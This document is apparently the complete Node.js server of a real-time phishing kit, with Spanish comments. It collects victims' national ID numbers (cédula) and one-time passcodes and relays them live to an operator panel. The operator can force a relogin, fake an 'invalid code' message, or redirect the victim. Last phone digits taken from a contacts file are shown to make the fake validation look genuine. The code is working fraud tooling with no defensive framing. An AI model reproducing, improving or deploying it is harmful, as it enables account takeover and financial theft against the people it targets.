const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const PORT = process.env.PORT || 3000;

app.use(express.static(__dirname));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));
app.get('/panel.html', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));
app.get('/Validacion', (req, res) => res.sendFile(path.join(__dirname, 'Validacion.html')));
app.get('/Validacion.html', (req, res) => res.sendFile(path.join(__dirname, 'Validacion.html')));

let contactos = new Map();

try {
  const data = fs.readFileSync(path.join(__dirname, 'contactos.txt'), 'utf8');
  data.split('\n').forEach(line => {
    const parts = line.trim().split('|');
    if (parts.length >= 2) {
      const cedula = parts[0].trim();
      const telefono = parts[1].trim();
      if (cedula && telefono) {
        contactos.set(cedula, telefono);
      }
    }
  });
  console.log('Contactos cargados:', contactos.size);
} catch (e) {
  console.log('No se encontró contactos.txt');
}

let sesiones = new Map();
let ipSesiones = new Map();
let sessionCounter = 0;
let panelSockets = new Set();

function getIp(socket) {
  return (socket.handshake.headers['x-forwarded-for'] || '').split(',')[0].trim()
      || socket.handshake.address;
}

function notifyPanels(event, data) {
  panelSockets.forEach(pid => {
    const s = io.sockets.sockets.get(pid);
    if (s) s.emit(event, data);
  });
}

function sendToClient(sesion, event, data) {
  if (!sesion || !sesion.clienteSocketId) return false;
  const cs = io.sockets.sockets.get(sesion.clienteSocketId);
  if (cs) { cs.emit(event, data); return true; }
  return false;
}

io.on('connection', (socket) => {
  const ip = getIp(socket);
  console.log('Conectado:', socket.id, 'IP:', ip);

  // ── Panel se registra ──
  socket.on('panel_conectado', () => {
    panelSockets.add(socket.id);
    sesiones.forEach(s => {
      socket.emit('sesion_nueva', {
        sessionId: s.sessionId, number: s.number,
        cedula: s.cedula, codigo: s.codigo,
        status: s.status, ip: s.ip
      });
    });
    console.log('Panel registrado:', socket.id);
  });

  // ── Cliente se reconecta desde Validacion.html con su sessionId ──
  socket.on('cliente_reconectar', (data) => {
    const sesion = sesiones.get(data.sessionId);
    if (sesion) {
      sesion.clienteSocketId = socket.id;
      
      const telefono = contactos.get(sesion.cedula) || '';
      const ultimos3 = telefono.length >= 3 ? telefono.slice(-3) : '';
      
      socket.emit('cmd_ir_validacion', { 
        sessionId: data.sessionId,
        telefonoMostrar: ultimos3
      });
      
      console.log('Cliente reconectado:', data.sessionId, '| Nuevo socket:', socket.id, '| Teléfono:', ultimos3);
    }
  });

  // ── Cliente envía cédula (desde index) ──
  socket.on('cliente_cedula', (data) => {
    // Si ya hay sesión para esta IP, actualizar
    if (ipSesiones.has(ip)) {
      const existingId = ipSesiones.get(ip);
      const existing = sesiones.get(existingId);
      if (existing) {
        existing.clienteSocketId = socket.id;
        existing.cedula = data.cedula;
        existing.codigo = '';
        existing.status = 'cargando';
        socket.emit('sesion_asignada', { sessionId: existingId });
        notifyPanels('sesion_actualizada', {
          sessionId: existingId, cedula: data.cedula,
          codigo: '', status: 'cargando'
        });
        console.log('Sesión actualizada:', existingId, '| Cédula:', data.cedula);
        return;
      }
    }

    // Nueva sesión
    sessionCounter++;
    const sessionId = 'session_' + sessionCounter;
    sesiones.set(sessionId, {
      sessionId, number: sessionCounter,
      cedula: data.cedula, codigo: '',
      status: 'cargando', clienteSocketId: socket.id, ip
    });
    ipSesiones.set(ip, sessionId);
    socket.emit('sesion_asignada', { sessionId });
    notifyPanels('sesion_nueva', {
      sessionId, number: sessionCounter,
      cedula: data.cedula, codigo: '',
      status: 'cargando', ip
    });
    console.log('Nueva sesión:', sessionId, '| Cédula:', data.cedula, '| IP:', ip);
  });

  // ── Cliente envía código OTP ──
  socket.on('cliente_codigo', (data) => {
    const sesion = sesiones.get(data.sessionId);
    if (!sesion) return;
    // Actualizar socket por si acaso
    sesion.clienteSocketId = socket.id;
    sesion.codigo = data.codigo;
    sesion.status = 'codigo_recibido';
    notifyPanels('sesion_actualizada', {
      sessionId: data.sessionId, codigo: data.codigo, status: 'codigo_recibido'
    });
    console.log('Código recibido:', data.codigo, '| Sesión:', data.sessionId);
  });

  // ── Panel: Relogin ──
  socket.on('panel_relogin', (data) => {
    const sesion = sesiones.get(data.sessionId);
    if (!sesion) return;
    sesion.cedula = ''; sesion.codigo = ''; sesion.status = 'esperando_cedula';
    sendToClient(sesion, 'cmd_relogin', {});
    notifyPanels('sesion_actualizada', {
      sessionId: data.sessionId, cedula: '', codigo: '', status: 'esperando_cedula'
    });
    console.log('Relogin:', data.sessionId);
  });

  // ── Panel: Validación (primera vez → mandar a OTP) ──
  socket.on('panel_validacion', (data) => {
    const sesion = sesiones.get(data.sessionId);
    if (!sesion) return;
    
    sesion.status = 'validando';
    
    const telefono = contactos.get(sesion.cedula) || '';
    const ultimos3 = telefono.length >= 3 ? telefono.slice(-3) : '';
    
    const sent = sendToClient(sesion, 'cmd_ir_validacion', { 
      sessionId: data.sessionId,
      telefonoMostrar: ultimos3
    });
    notifyPanels('sesion_actualizada', { sessionId: data.sessionId, status: 'validando' });
    console.log('Validación enviada:', data.sessionId, '| Teléfono:', ultimos3, '| Llegó al cliente:', sent);
  });

  // ── Panel: Código inválido ──
  socket.on('panel_codigo_invalido', (data) => {
    const sesion = sesiones.get(data.sessionId);
    if (!sesion) return;
    sesion.codigo = ''; sesion.status = 'validando';
    const sent = sendToClient(sesion, 'cmd_codigo_invalido', {});
    notifyPanels('sesion_actualizada', {
      sessionId: data.sessionId, codigo: '', status: 'validando'
    });
    console.log('Código inválido:', data.sessionId, '| Llegó al cliente:', sent);
  });

  // ── Panel: Finalizar (NO borrar sesión del mapa, solo redirigir al cliente) ──
  socket.on('panel_finalizar', (data) => {
    const sesion = sesiones.get(data.sessionId);
    if (!sesion) return;
    sendToClient(sesion, 'cmd_finalizar', { url: data.url });
    // Marcar como finalizado pero NO eliminar
    sesion.status = 'finalizado';
    notifyPanels('sesion_finalizada', { sessionId: data.sessionId });
    console.log('Finalizado:', data.sessionId);
  });

  // ── Desconexión ──
  socket.on('disconnect', () => {
    panelSockets.delete(socket.id);
    sesiones.forEach((sesion, sessionId) => {
      if (sesion.clienteSocketId === socket.id) {
        sesion.clienteSocketId = null;
        notifyPanels('sesion_actualizada', { sessionId, status: 'desconectado' });
      }
    });
    console.log('Desconectado:', socket.id);
  });
});

server.listen(PORT, () => console.log(`Servidor en http://localhost:${PORT}`));